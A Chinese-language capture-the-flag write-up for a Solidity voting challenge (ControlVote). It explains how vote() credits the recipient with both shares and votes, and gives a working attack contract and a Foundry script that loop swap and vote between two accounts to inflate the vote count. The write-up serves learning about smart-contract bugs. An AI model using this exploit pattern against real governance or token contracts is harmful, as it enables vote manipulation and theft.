源码：`Setup.sol`&`Contract.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./Contract.sol";

/// @title Setup - Deployment and initialization of the ControlVote challenge
contract Setup {
    ControlVote public controlVote;
    address public immutable competitor;
    address private xiaoheizi1;
    address private xiaoheizi2;
    bool public solved;

    constructor(address _addr1, address _addr2) {
        controlVote = new ControlVote();
        competitor = controlVote.competitor();

        xiaoheizi1 = _addr1;
        xiaoheizi2 = _addr2;

        controlVote.addWhitelist(xiaoheizi1);
        controlVote.addWhitelist(xiaoheizi2);

        controlVote.setshares(xiaoheizi1, 2);
        controlVote.setshares(xiaoheizi2, 2);
    }
    function isSolved() external returns (bool) {
        if (controlVote.Votes(msg.sender) > controlVote.Votes(competitor)) {
            solved = true;
        }
        return solved;
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract ControlVote {
    event VoteDelegated(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event Voted(address indexed from, address indexed to, uint256 amount);
    event SwappedVotes(address indexed user, uint256 voteAmount);
    event VotesBurned(address indexed user);

    address public owner;
    address public constant competitor =
        0x1000000000000000000000000000000000000010;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public Votes;
    mapping(address => mapping(uint256 => uint256)) internal isdelegted;

    uint256 constant BITS_PER_WORD = 256;
    constructor() {
        owner = msg.sender;
        Votes[competitor] = 100;
    }

    function addWhitelist(address user) external {
        require(msg.sender == owner, "Not authorized");
        whitelisted[user] = true;
    }

    function joinWhitelist() external {
        require(!whitelisted[msg.sender], "Already joined once");
        require(Votes[msg.sender] >= 1, "Insufficient votes to join");
        whitelisted[msg.sender] = true;
    }

    function setshares(address user, uint256 _votes) external {
        require(msg.sender == owner, "Not authorized");
        shares[user] = _votes;
    }

    function _getIndices(
        address to
    ) internal pure returns (uint256 wordIndex, uint256 bitIndex) {
        uint256 index = uint160(to);
        wordIndex = index / BITS_PER_WORD;
        bitIndex = index % BITS_PER_WORD;
    }

    function grant(address to) external { 
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] |= (1 << bitIndex);
    } //拨款

    function revoke(address to) external {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] &= ~(1 << bitIndex);
    } //撤销，废除

    function isAuthorized(address from, address to) public view returns (bool) {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        return (isdelegted[from][wordIndex] >> bitIndex) & 1 == 1;
    }

    function delegate(address from, address to, uint256 _votes) external {
        require(isAuthorized(from, to), "Not authorized");
        require(whitelisted[from] && whitelisted[to], "Not whitelisted");
        require(shares[from] >= _votes, "Insufficient votes");
        require(from != to, "Cannot delegate to self");
        require(_votes > 0, "Votes must be greater than zero");
        shares[from] -= _votes;
        shares[to] += _votes;

        emit VoteDelegated(from, to, _votes);
    }
    function calculateVotingPowerHash(
        address user,
        uint256 salt
    ) external pure returns (bytes32) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, user)
            mstore(add(ptr, 0x20), salt)
            mstore(add(ptr, 0x40), xor(user, salt))
            mstore(add(ptr, 0x60), shr(3, salt))
            mstore(add(ptr, 0x80), shl(5, user))
            let hashed := keccak256(ptr, 0xA0)

            mstore(0x0, hashed)
            return(0x0, 32)
        }
    }

    function swap() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        uint256 userVotes = Votes[msg.sender];
        require(userVotes > 0, "No votes to swap");
        Votes[msg.sender] = 0;
        shares[msg.sender] += userVotes;

        emit SwappedVotes(msg.sender, userVotes);
    }

    function vote(address addr, uint256 numbers) public {
        require(whitelisted[msg.sender], "Not whitelisted");
        require(shares[msg.sender] >= numbers, "Insufficient votes");
        require(addr != msg.sender, "Cannot vote for self");
        shares[msg.sender] -= numbers;
        shares[addr] += numbers;
        Votes[addr] += numbers;

        emit Voted(msg.sender, addr, numbers);
    }

    function AssemblyLogic(address user) external view returns (uint256 kun) {
        assembly {
            let v := shr(2, shl(5, 1))
            let val := xor(v, 0x1234)
            kun := add(val, Votes.slot)
        }
    }

    function Optimizer() public view returns (uint256) {
        assembly {
            let t := mul(timestamp(), number())
            let h := blockhash(number())
            let fake := add(t, mod(mload(add(h, 0x20)), 1337))
            mstore(0x0, fake)
            return(0x0, 0x20)
        }
    }

    function buyVotes() external payable {
        require(msg.value >= 1 ether, "Min 1 ether");
        Votes[msg.sender] += msg.value / 1 ether;
    }

    function getVotes(address user) external view returns (uint256) {
        return Votes[user];
    }
    function getShare(address user) external view returns (uint256) {
        return shares[user];
    }

    function burnVotes() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        Votes[msg.sender] = 0;
        emit VotesBurned(msg.sender);
    }

    receive() external payable {}
}
```

目标是让我的票数大于竞争者的票数

这道题的漏洞出现在`vote`函数上：

```solidity
function vote(address addr, uint256 numbers) public {
    require(whitelisted[msg.sender], "Not whitelisted");
    require(shares[msg.sender] >= numbers, "Insufficient votes");
    require(addr != msg.sender, "Cannot vote for self");
    shares[msg.sender] -= numbers;
    shares[addr] += numbers;
    Votes[addr] += numbers;

    emit Voted(msg.sender, addr, numbers);
}
```

投票时投票人的`shares`会减少，被投的人`votes`会增加相应的数，但是同时被投的人的`shares`也会增加，这样就会凭空出现可投的票，这样两个人互相投票就会达到刷票的效果

主要攻击逻辑就靠`swap`和`vote`函数，但是前提需要加入白名单，并且手里也需要有票，所以先买张票，再加入白名单，最后互相刷票，我是在攻击合约和脚本中互相刷票

攻击合约：`Attack.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {ControlVote} from "../src/Contract.sol";
import {Setup} from "../src/Setup.sol";

contract Attack {
    Setup setup = Setup(payable(0xb1d71707C326AC75a35a43868012A4503d2F9A63));
    ControlVote controlvote = setup.controlVote();
    function attack() external payable {
        controlvote.buyVotes{value: msg.value}();
        controlvote.joinWhitelist();
    }
    function attack2() external {
        uint256 votes = controlvote.getShare(address(this));
        controlvote.swap();
        controlvote.vote(msg.sender, votes);
    }
}
```

脚本：`Hack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {ControlVote} from "../src/Contract.sol";
import {Setup} from "../src/Setup.sol";
import {Attack} from "../src/Attack.sol";

contract POC is Script {
    Setup setup = Setup(payable(0xb1d71707C326AC75a35a43868012A4503d2F9A63));
    ControlVote controlvote = setup.controlVote();
    
    function run() external {
        vm.startBroadcast();

        Attack attack = new Attack();
        controlvote.buyVotes{value: 1 ether}();
        // controlvote.joinWhitelist();
        attack.attack{value: 1 ether}();
        for(uint i=0;i<10;i++) {
            uint256 votes = controlvote.getVotes(msg.sender);
            controlvote.swap();
            controlvote.vote(address(attack), votes);
            attack.attack2();
            if(controlvote.getVotes(msg.sender) > 100) {
                break;
            }
        }
        console.log(controlvote.getVotes(address(attack)));
        console.log(controlvote.getVotes(msg.sender));
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

```

